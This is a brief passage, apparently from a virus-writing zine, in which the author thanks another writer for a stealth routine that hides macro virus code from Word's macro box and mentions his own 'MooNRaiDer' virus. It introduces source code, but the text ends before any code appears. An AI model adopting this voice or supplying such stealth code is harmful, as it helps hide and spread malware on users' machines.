At first I want to say thankz to Virtual Boy for his great full-stealht
routine. Yeah, right. I mean a full stealht routine, which hide all virus
macros and the best the virus works, too. Forget now this really bad
ToolsMacro Box from my MooNRaiDer virus and look at this fantastic code.

OK, here is the source code:
